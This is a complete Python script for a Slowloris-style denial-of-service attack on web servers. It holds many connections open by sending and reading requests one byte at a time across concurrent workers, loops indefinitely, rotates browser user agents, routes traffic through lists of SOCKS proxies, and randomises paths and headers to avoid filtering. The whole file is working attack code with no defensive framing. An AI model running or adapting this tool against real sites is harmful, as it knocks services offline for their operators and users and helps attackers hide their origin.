from python_socks.async_.asyncio import Proxy
import argparse
import asyncio
import functools
import random
import re
import ssl
import string
import time
import urllib.parse

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3',
]

DEFAULT_HEADERS = {
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
}

parser = argparse.ArgumentParser(usage='url [OPTIONS...]')
parser.add_argument('url', help='if a keyword is present in the url, it will be replaced with a string. more information is shown in the keywords section')
parser.add_argument('--workers', type=int, default=8, help='(default: %(default)s)')
parser.add_argument('--interval', type=float, default=1, metavar='SECONDS', help='interval between requests (default: %(default)s)')
parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='connection timeout (default: %(default)s)')
parser.add_argument('--read-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second (default: %(default)s)')
parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second (default: %(default)s)')
parser.add_argument('-H', '--header', action='append', default=[], help='add custom header')
parser.add_argument('-Hn', '--header-n', action='append', default=[], help='send custom header N times. if a keyword is present in the header, it will be replaced with a string. more information is shown in the keywords section', nargs=2, metavar=('HEADER', 'N'))
parser.add_argument('-X', '--request', default='GET', help='request method (default: %(default)s)')
parser.add_argument('-d', '--data', action='append', default=[], help='if a keyword is present in data, it will be replaced with a string. more information is shown in the keywords section')
parser.add_argument('-x', '--proxy', action='append', default=[], help="(example: socks5://...)")
parser.add_argument('-xf', '--proxy-file', metavar="FILE", help="load all line separated proxies from FILE")

FUZZ_KW = {}

def randstr(seq, min, max=None):
    if max is None:
        return ''.join([random.choice(seq) for i in range(min)])
    return ''.join([random.choice(seq) for i in range(random.randint(min, max))])

def fuzz(s: str):
    for k,f in FUZZ_KW.items():
        s = str(re.sub(re.escape(k), f, s))
    return s

fuzz_kw_group = parser.add_argument_group('keywords')

for min,max,suffix in [(16,32,''), (2,8,'-S'), (128,256,'-B')]:
    kw = f'%RAND{suffix}%'
    fuzz_kw_group.add_argument(kw, nargs='?', help=f'replaced by a random string of letters+numbers with length {min}-{max}')
    FUZZ_KW[kw] = eval(f'lambda f: randstr(string.ascii_letters+string.digits, {min}, {max})')

for min,max,suffix in [(16,32,''), (2,8,'-S'), (128,256,'-B')]:
    kw = f'%RANDS{suffix}%'
    fuzz_kw_group.add_argument(kw, nargs='?', help=f'replaced by a random string of letters with length {min}-{max}')
    FUZZ_KW[kw] = eval(f'lambda f: randstr(string.ascii_letters+string.digits, {min}, {max})')

args = parser.parse_args()

for h,n in args.header_n:
    try:
        int(n)
    except Exception as e:
        print(f'Second argument of "-Hn \'{h}\' {n}" is not a number')
        exit(1)

args.header_n = [(h,int(n)) for h,n in args.header_n]

args.proxy = set([p.strip() for p in args.proxy])

if args.proxy_file:
    with open(args.proxy_file) as f:
        for line in f:
            line = line.strip()
            args.proxy.add(line)

args.proxy = list(args.proxy)

[Proxy.from_url(p) for p in args.proxy] # check if all proxies are valid

url = urllib.parse.urlparse(args.url)
if url.scheme not in ['', 'http', 'https']:
    print(f'Invalid http scheme {url.scheme}')
    exit(1)

if not re.match(r"https?://.*", args.url):
    args.url = 'http://' + args.url

url = urllib.parse.urlparse(args.url)
hostname = url.hostname
port = url.port
https = url.scheme == 'https'

if port is None:
    if url.scheme == 'http':
        port = 80
    else:
        port = 443

def slowloris_timeout(timeout):
    def decorate(func):
        @functools.wraps(func)
        async def wrapper(*args, **kwargs):
            async with asyncio.timeout(timeout):
                return await func(*args, **kwargs)
        return wrapper
    return decorate

async def slowloris_write(writer, data, rate):
    if rate == 0:
        if type(data) == str:
            writer.write(data.encode())
        else:
            writer.write(data)
        return

    for char in data:
        if type(char) == str:
            writer.write(char.encode())
        else:
            writer.write(char.to_bytes())
        await asyncio.sleep(rate)

async def slowloris_read(reader, rate, n=-1):
    if rate == 0:
        return await reader.read(n)

    data = b""
    if n == 0:
        return data
    while True:
        d = await reader.read(1)
        if len(d) == 0:
            return data
        n -= 1
        data += d
        if n == 0:
            return data
        await asyncio.sleep(rate)

async def slowloris_readuntil(reader, sep, rate):
    if rate == 0:
        return await reader.readuntil(sep)

    data = b''
    while True:
        if data.endswith(sep):
            return data
        d = await reader.read(1)
        if len(d) == 0:
            return data
        data += d
        await asyncio.sleep(rate)

@slowloris_timeout(args.timeout)
async def slowloris_open(host, port, https, proxies):
    ssl_ctx = None
    if https:
        ssl_ctx = ssl.create_default_context()

    if len(proxies) == 0:
        return await asyncio.open_connection(host, port, ssl=ssl_ctx)

    proxy = Proxy.from_url(random.choice(proxies))
    sock = await proxy.connect(dest_host=host, dest_port=port, timeout=99999999)
    return await asyncio.open_connection(host=None, port=None, sock=sock, ssl=ssl_ctx, server_hostname=host if https else None)

async def slowloris_attack_loop(*args, **kwargs):
    while True:
        try:
            await slowloris_attack(*args, **kwargs)
        except Exception as e:
            if len(str(e).strip()) != 0:
                print(f'{e.__class__.__name__}: {e}')
            else:
                print(f'{e.__class__.__name__}')

async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxies, interval, request_method, data_list, headers_n_list):

    time_conn_start = time.time()

    reader, writer = await slowloris_open(host, port, https, proxies)

    print(f'Connection established in {time.time()-time_conn_start} seconds')

    headers = DEFAULT_HEADERS
    headers['Host'] = host
    headers['User-Agent'] = random.choice(USER_AGENTS)

    raw_data = '&'.join([fuzz(d) for d in data_list]).encode()

    for h in headers_list:
        data = h.split(':')
        headers[data[0].strip()] = ':'.join(data[1:]).strip()

    headers['Connection'] = 'keep-alive'

    if len(raw_data) > 0:
        headers['Content-Length'] = len(raw_data)

    if path is None or len(path) == 0:
        path = '/'

    while True:

        time_write_start = time.time()

        await slowloris_write(writer, f'{request_method} {fuzz(path)} HTTP/1.1\r\n', write_rate)

        for k,v in headers.items():
            await slowloris_write(writer, f'{k}: {v}\r\n', write_rate)

        for h,n in headers_n_list:
            for _ in range(n):
                await slowloris_write(writer, f'{fuzz(h).strip()}\r\n', write_rate)

        await slowloris_write(writer, '\r\n', write_rate)

        if len(raw_data) > 0:
            await slowloris_write(writer, raw_data, write_rate)

        await writer.drain()

        print(f'Sent http request in {time.time()-time_write_start} seconds')

        time_read_start = time.time()

        raw_response_headers = await slowloris_readuntil(reader, b'\r\n\r\n', read_rate)
        raw_response_headers = raw_response_headers.strip().split(b'\r\n')

        response_headers = {}

        if len(raw_response_headers) <= 1:
            writer.close()
            raise Exception('Could not get response headers')

        for h in raw_response_headers[1:]:
            data = h.split(b':')
            response_headers[data[0].strip().lower()] = b':'.join(data[1:]).strip()

        status_text = raw_response_headers[0].decode()

        if length := int(response_headers.get(b'content-length', 0)):
            await slowloris_read(reader, read_rate, n=length)

        print(f'Got http response {status_text} in {time.time()-time_read_start} seconds')

        if response_headers.get(b'connection', b'').lower() == b'close':
            print('Unable to keep-alive, got "Connection: close" in response headers')
            writer.close()
            await asyncio.sleep(args.interval)
            return

        await asyncio.sleep(args.interval)

async def run(workers, *args, **kwargs):
    await asyncio.gather(*[slowloris_attack_loop(*args, **kwargs) for i in range(workers)])

asyncio.run(run(
    args.workers,
    hostname,
    port,
    args.read_rate,
    args.write_rate,
    https=https,
    path=url.path,
    headers_list=args.header,
    proxies=args.proxy,
    interval=args.interval,
    request_method=args.request,
    data_list=args.data,
    headers_n_list=args.header_n,
))
